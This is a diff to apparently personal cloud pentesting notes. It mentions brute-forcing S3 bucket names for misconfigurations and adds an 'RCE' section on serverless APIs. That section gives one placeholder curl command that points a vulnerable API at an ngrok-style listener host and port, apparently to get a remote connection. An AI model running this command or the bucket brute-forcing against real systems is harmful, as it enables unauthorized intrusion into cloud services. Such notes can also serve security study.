@@ -21,3 +21,10 @@ Identity and Access Management (IAM) = the main consept of IMA is Role-Based Acc
 
 # Security Misconfig attack
 ***We can use s3 bucket finder tool, For brute force s3 bucket and AWS CLI tool for find security misconfig attack***
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# serverless architecture attack RCE
+
+***curl "https://domain/api/panther?host=ngrock&port=port-numer" -H 'x-api-key: valuehere'***
+
